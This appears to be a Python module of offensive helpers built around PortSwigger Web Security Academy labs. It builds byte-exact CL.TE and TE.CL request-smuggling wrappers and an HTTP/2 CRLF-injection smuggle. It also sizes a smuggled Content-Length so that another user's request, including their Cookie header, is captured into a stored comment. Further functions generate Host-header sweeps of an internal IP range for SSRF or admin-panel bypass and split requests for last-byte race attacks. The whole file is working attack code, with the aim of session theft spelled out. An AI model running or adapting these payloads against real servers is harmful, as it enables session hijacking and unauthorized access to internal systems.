"""CL.TE capture-request smuggling: build the byte-exact smuggle and size the
smuggled Content-Length from a sample of the victim's request.

The "capture other users' requests" class (PortSwigger) desyncs a front-end
that honours Content-Length against a back-end that honours Transfer-Encoding,
so a smuggled POST /post/comment with an oversized Content-Length swallows the
next user's request into a stored comment. Two things are fiddly and were, in
practice, done by hand:

  1. The OUTER request's Content-Length must equal the length of the chunk
     terminator plus the whole smuggled request, or the front-end waits for
     more bytes (hang) or truncates the smuggle.
  2. The SMUGGLED Content-Length must reach the target header (the victim's
     Cookie) yet not exceed the victim request's total length — too small and
     the captured comment truncates before the cookie; too large and the
     back-end waits forever for bytes the victim never sends (timeout).

These helpers compute both from data instead of a blind Content-Length search.
Pure functions — no Burp round-trip; feed the result to send_raw_request with
http_version="direct".

This module also holds sibling desync/host-header primitives surfaced by the
same lab family:
  - wrap_clte / wrap_tecl  — the two byte-exact HTTP/1 smuggle wrappers.
  - build_host_sweep       — Host-header sweep raws (routing-based SSRF /
    host-header auth bypass) for send_raw_request, which preserves a divergent
    Host where curl_request / concurrent_requests drop it (Montoya re-derives
    Host from the connection service).
  - build_h2_crlf_smuggle  — HTTP/2-request-smuggling-via-CRLF-injection
    components for a raw h2 client (send_raw_request cannot inject a CRLF into
    an h2 header value).
"""

CRLF = "\r\n"


def wrap_clte(host: str, smuggled_request: str, path: str = "/") -> str:
    """Wrap a smuggled HTTP/1.1 request in a CL.TE outer request.

    The outer request carries Content-Length = len("0\\r\\n\\r\\n" +
    smuggled_request) and Transfer-Encoding: chunked. A front-end that honours
    Content-Length forwards exactly those bytes; a back-end that honours
    Transfer-Encoding sees the terminating 0-chunk end the first request and
    treats the smuggled bytes as the start of the next. Returns the complete
    raw request (LF endings; send_raw_request normalises to CRLF, and the
    Content-Length here is counted on the CRLF form so it matches the wire).
    """
    outer_body = "0" + CRLF + CRLF + smuggled_request
    outer_cl = len(outer_body.encode())
    return (
        f"POST {path} HTTP/1.1" + CRLF
        + f"Host: {host}" + CRLF
        + "Content-Type: application/x-www-form-urlencoded" + CRLF
        + f"Content-Length: {outer_cl}" + CRLF
        + "Transfer-Encoding: chunked" + CRLF
        + CRLF
        + outer_body
    )


def wrap_tecl(host: str, smuggled_request: str, path: str = "/") -> str:
    """Wrap a smuggled HTTP/1.1 request in a TE.CL outer request.

    Mirror of wrap_clte for the opposite desync: a front-end that honours
    Transfer-Encoding against a back-end that honours Content-Length. The body
    is a single chunk holding the smuggled request, terminated by a 0-chunk. The
    front-end (TE) reads the whole chunk and forwards it; the back-end (CL)
    consumes only the chunk-size line as the first request's body and parses the
    smuggled bytes as the next request. The outer Content-Length is set to the
    byte length of that chunk-size line (hex + CRLF) so the back-end stops
    exactly there — computed here, because a >255-byte smuggle needs a 3-hex-digit
    size line and thus Content-Length 5, not the 4 that a hand-written 2-digit
    template assumes.

    The smuggled request must carry its OWN Content-Length large enough to absorb
    the trailing "0" chunk (and the head of the next real request) so the back-end
    does not error — that is the caller's payload, not this wrapper's job.
    """
    chunk_hex = format(len(smuggled_request.encode()), "x")
    size_line = chunk_hex + CRLF
    outer_cl = len(size_line.encode())
    body = size_line + smuggled_request + CRLF + "0" + CRLF + CRLF
    return (
        f"POST {path} HTTP/1.1" + CRLF
        + f"Host: {host}" + CRLF
        + "Content-Type: application/x-www-form-urlencoded" + CRLF
        + f"Content-Length: {outer_cl}" + CRLF
        + "Transfer-Encoding: chunked" + CRLF
        + CRLF
        + body
    )


def capture_cl_through(sample_request: str, prefix_len: int,
                       capture_through: str = "cookie") -> dict:
    """Recommend the smuggled Content-Length so the stored capture reaches the
    END of the ``capture_through`` header line in a sample of the victim's
    request.

    The smuggled comment body up to the reflected field (e.g.
    ``csrf=...&website=&comment=``) is ``prefix_len`` bytes; the victim's
    request is appended to it, so the comment holds ``prefix_len + D`` bytes
    once ``D`` bytes of the victim have arrived. To store the victim through
    the end of a header line at depth ``D``, set the smuggled Content-Length to
    ``prefix_len + D``.

    Args:
        sample_request: A captured (even truncated) copy of the victim request,
            with real CRLF or LF line breaks.
        prefix_len: Byte length of the smuggled comment body before the victim
            is appended (the part ending in ``...&comment=``).
        capture_through: Header name whose line must be fully captured
            (default ``cookie`` — the class's target).

    Returns:
        dict with ``content_length`` (recommended smuggled Content-Length),
        ``capture_depth`` (bytes of the victim captured), and ``found``
        (False when ``capture_through`` is absent from the sample — the
        content_length is then only a floor; capture a deeper sample first).
        When found, the caller should still expect the victim to SELF-complete
        only if content_length <= prefix_len + victim_total; since the cookie
        is usually the last header, that means content_length ~= this value.
    """
    idx = sample_request.lower().find(capture_through.lower())
    if idx < 0:
        depth = len(sample_request.encode())
        return {"content_length": prefix_len + depth,
                "capture_depth": depth, "found": False}
    nl = sample_request.find("\n", idx)
    end = nl + 1 if nl >= 0 else len(sample_request)
    depth = len(sample_request[:end].encode())
    return {"content_length": prefix_len + depth,
            "capture_depth": depth, "found": True}


def build_host_sweep(target_host: str, path: str = "/admin",
                     base: str = "192.168.0", start: int = 1, end: int = 255,
                     extra_headers: dict | None = None) -> list[tuple[str, str]]:
    """Build send_raw_request raw strings for a Host-header sweep over an IP range.

    Routing-based SSRF and Host-header auth-bypass need the Host header to DIVERGE
    from the connection target. Montoya re-serialises the Host from the connection
    service on the curl_request / concurrent_requests path, so a divergent Host is
    silently dropped there; send_raw_request goes over a direct HTTP/1 socket and
    preserves it. This returns [(ip, raw), ...] to feed one at a time (or in
    parallel batches) to send_raw_request(host=target_host, http_version="1").
    A dead internal IP returns 504 (gateway timeout); the admin returns 200 — the
    one non-504/non-403 in the sweep.

    Args:
        target_host: The lab host to actually connect to (send_raw_request `host`).
        path: Path to request on the internal target (default /admin).
        base: /24 network prefix (default 192.168.0).
        start, end: inclusive last-octet range to sweep (default 1..255).
        extra_headers: optional headers added to every request.
    """
    hdr = "".join(f"{CRLF}{k}: {v}" for k, v in (extra_headers or {}).items())
    out: list[tuple[str, str]] = []
    for n in range(start, end + 1):
        ip = f"{base}.{n}"
        raw = (f"GET {path} HTTP/1.1{CRLF}Host: {ip}{hdr}"
               f"{CRLF}Connection: close{CRLF}{CRLF}")
        out.append((ip, raw))
    return out


def build_h2_crlf_smuggle(host: str, smuggled_request: str, carrier: str = "foo",
                          inject: str = "transfer-encoding: chunked",
                          method: str = "POST", path: str = "/") -> dict:
    """Build the components for HTTP/2 request smuggling via CRLF injection.

    send_raw_request cannot express this attack: it needs a header whose VALUE
    contains a literal CRLF so a smuggled header (e.g. Transfer-Encoding: chunked)
    survives the front-end's HTTP/2->HTTP/1 downgrade as its own header line — a
    normal TE header is stripped before downgrade. Returns an h2 header list (with
    the CRLF-injected carrier header) plus the DATA body, for a raw h2 client
    configured with validate_outbound_headers=False / normalize_outbound_headers=
    False (Burp's HTTP/2 tab does this natively). For H2.TE capture, `smuggled_request`
    is the chunk terminator + smuggled request, e.g.
    "0\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nHost: h\\r\\nContent-Length: 700\\r\\n\\r\\nsearch=".

    Returns dict: {headers: [(name,value)...], body: str, carrier_value: str}.
    """
    carrier_value = f"bar{CRLF}{inject}"
    headers = [
        (":method", method), (":path", path), (":scheme", "https"),
        (":authority", host),
        (carrier, carrier_value),
        ("content-type", "application/x-www-form-urlencoded"),
    ]
    return {"headers": headers, "body": smuggled_request, "carrier_value": carrier_value}


def last_byte_sync(raw_requests: list) -> list:
    """Split each raw HTTP/1.1 request into (head, final_byte) for a last-byte-
    synchronised race.

    concurrent_requests fires each request once and its completions stagger
    across the wire, so it cannot hit a tight race window (order-validate vs
    order-confirm, move-then-scan file upload, etc). The last-byte technique
    removes the jitter: send every request's HEAD first, each on its own
    kept-alive connection, so all the server has left to receive is one byte;
    then send all the withheld final bytes back-to-back. The requests then
    complete at the server within microseconds of each other. (Over HTTP/2 the
    same idea is the single-packet attack: withhold the last DATA frame of every
    stream, then flush them all in one TCP segment.)

    Returns [(head, final_byte), ...] as bytes; rejects an empty request.
    """
    out = []
    for r in raw_requests:
        b = r.encode() if isinstance(r, str) else bytes(r)
        if not b:
            raise ValueError("empty request cannot be last-byte split")
        out.append((b[:-1], b[-1:]))
    return out
